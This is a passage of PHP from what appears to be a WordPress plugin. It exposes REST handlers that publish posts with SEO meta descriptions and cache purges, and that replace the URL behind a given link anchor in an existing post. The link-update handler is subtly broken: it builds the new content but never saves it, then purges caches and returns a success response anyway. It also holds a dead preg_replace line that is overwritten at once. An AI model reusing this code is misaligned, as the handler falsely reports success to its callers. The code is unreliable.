$cat_name=isset($p["category"])?sanitize_text_field($p["category"]):"";
$img_id=intval($p["image_id"]??0);
if(!$title||!$content){return rest_ensure_response(array("error"=>"missing title or content"));}
$existing=get_page_by_path($slug,$ptype);
if($existing){$suffix=2;$base_slug=$slug;while(get_page_by_path($slug,$ptype)){$slug=$base_slug."-".$suffix;$suffix++;}$title=$title." ".$suffix;}
$cat_id=0;
if($cat_name&&$ptype==="post"){$cat=get_category_by_slug(sanitize_title($cat_name));if(!$cat){$cat_id=wp_create_category($cat_name);}else{$cat_id=$cat->term_id;}}
$tags_str=isset($p["tags"])?sanitize_text_field($p["tags"]):"";
$post_arr=array("post_title"=>$title,"post_content"=>$content,"post_name"=>$slug,"post_type"=>$ptype,"post_status"=>$status);
if($cat_id>0){$post_arr["post_category"]=array($cat_id);}
if($tags_str&&$ptype==="post"){$post_arr["tags_input"]=$tags_str;}
$post_id=wp_insert_post($post_arr,true);
if(is_wp_error($post_id)){return rest_ensure_response(array("error"=>$post_id->get_error_message()));}
if($img_id>0){set_post_thumbnail($post_id,$img_id);}
if($desc){
update_post_meta($post_id,"_yoast_wpseo_metadesc",$desc);
update_post_meta($post_id,"rank_math_description",$desc);
update_post_meta($post_id,"_aioseop_description",$desc);
update_post_meta($post_id,"_genesis_description",$desc);
wp_update_post(array("ID"=>$post_id,"post_excerpt"=>$desc));
}
clean_post_cache($post_id);
if(function_exists("rocket_clean_post")){rocket_clean_post($post_id);}
if(class_exists("LiteSpeed_Cache_API")){LiteSpeed_Cache_API::purge_post($post_id);}
if(function_exists("w3tc_flush_post")){w3tc_flush_post($post_id);}
clean_post_cache($post_id);
$post_url=get_permalink($post_id);
if(!$post_url||strpos($post_url,"?p=0")!==false){
  $post_url=get_bloginfo("url")."/?p=".$post_id;
  $pobj=get_post($post_id);
  if($pobj&&$pobj->post_name){$post_url=home_url("/".$ptype."/".$pobj->post_name."/");}
}
$this->ci_log("[publish_post] id=".$post_id." title=".$title." url=".$post_url);
return rest_ensure_response(array("ok"=>1,"post_id"=>$post_id,"post_url"=>$post_url,"slug"=>$slug));
}catch(Exception $e){return rest_ensure_response(array("error"=>$e->getMessage()));}
}

public function api_update_post_link($r){
try{
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$post_id=intval($p["post_id"]??0);
$old_anchor=isset($p["old_anchor"])?$p["old_anchor"]:"";
$new_url=isset($p["new_url"])?esc_url_raw($p["new_url"]):"";
if(!$post_id||!$old_anchor||!$new_url){return rest_ensure_response(array("error"=>"missing params"));}
$post=get_post($post_id);
if(!$post){return rest_ensure_response(array("error"=>"post not found"));}
$content=$post->post_content;
$old_link=NULL;if(preg_match_all('/<a[^>]+>.*?<\/a>/is',$content,$lm)){foreach($lm[0] as $lhtml){if(stripos(strip_tags($lhtml),$old_anchor)!==false){$old_link=$lhtml;break;}}}
if(!$old_link){return rest_ensure_response(array("error"=>"anchor not found","anchor"=>$old_anchor));} $new_link=preg_replace('/<a([^>]*)>/i','<a$1>','<a href="'.esc_url($new_url).'">'.$old_anchor.'</a>'); $new_link='<a href="'.esc_url($new_url).'">'.$old_anchor.'</a>';
$new_content=$old_link ? str_replace($old_link,$new_link,$content) : $content;
if($new_content===$content){return rest_ensure_response(array("error"=>"not replaced"));}
clean_post_cache($post_id);
if(function_exists("rocket_clean_post")){rocket_clean_post($post_id);}
if(class_exists("LiteSpeed_Cache_API")){LiteSpeed_Cache_API::purge_post($post_id);}
$this->ci_log("[update_post_link] id=".$post_id." anchor=".$old_anchor." new_url=".$new_url);
return rest_ensure_response(array("ok"=>1,"post_id"=>$post_id));
}catch(Exception $e){return rest_ensure_response(array("error"=>$e->getMessage()));}
}

}

new WPOC_Runtime();
